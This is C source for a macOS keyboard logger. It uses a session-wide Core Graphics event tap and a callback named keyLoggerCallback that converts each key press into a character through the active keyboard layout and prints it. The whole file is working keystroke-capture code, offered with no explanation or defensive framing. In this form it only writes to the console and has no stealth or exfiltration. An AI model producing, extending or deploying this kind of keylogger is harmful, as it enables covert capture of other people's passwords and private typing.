#include <ApplicationServices/ApplicationServices.h>
#include <CoreFoundation/CoreFoundation.h>
#include <Carbon/Carbon.h>
#include <stdio.h>

CGEventRef keyLoggerCallback(CGEventTapProxy proxy, CGEventType type, CGEventRef event, void *refcon) { 
    if(type != kCGEventKeyDown && type != kCGEventKeyUp){
        return event;
    }

    uint32_t keycode = CGEventGetIntegerValueField(event, kCGKeyboardEventKeycode);

    TISInputSourceRef currentKeyboard = TISCopyCurrentKeyboardInputSource();
    CFDataRef layoutData = TISGetInputSourceProperty(currentKeyboard, kTISPropertyUnicodeKeyLayoutData);
    const UCKeyboardLayout *keyboardLayout = (const UCKeyboardLayout *)CFDataGetBytePtr(layoutData);

    UInt32 keysDown = 0;
    UniChar characters[4];
    UniCharCount realLength;

    UCKeyTranslate(keyboardLayout,
                   keycode,
                   kUCKeyActionDown,
                   0, 
                   LMGetKbdType(),
                   kUCKeyTranslateNoDeadKeysBit,
                   &keysDown,
                   sizeof(characters) / sizeof(characters[0]),
                   &realLength,
                   characters);

    CFRelease(currentKeyboard);

    if (realLength > 0) {
        char charStr[5];
        CFStringGetCString(CFStringCreateWithCharacters(kCFAllocatorDefault, characters, 1), charStr, 5, kCFStringEncodingUTF8);
        printf("Key pressed: %s\n", charStr);
    } else {
        printf("Key pressed: %u\n", keycode);
    }

    return event;
}


int main(){
    CGEventMask eventMask = CGEventMaskBit(kCGEventKeyDown);
    CFMachPortRef eventTap = CGEventTapCreate(kCGSessionEventTap, kCGHeadInsertEventTap, 0, eventMask, keyLoggerCallback, NULL);

    if (!eventTap) {
    fprintf(stderr, "Failed to create event tap, permissions denied\n");
    exit(1);
    }

    CFRunLoopSourceRef runLoopSource = CFMachPortCreateRunLoopSource(kCFAllocatorDefault, eventTap, 0);
    CFRunLoopAddSource(CFRunLoopGetCurrent(), runLoopSource, kCFRunLoopCommonModes);

    CGEventTapEnable(eventTap, true);
    CFRunLoopRun();

    CFRelease(eventTap);
    CFRelease(runLoopSource);

    return 0;
}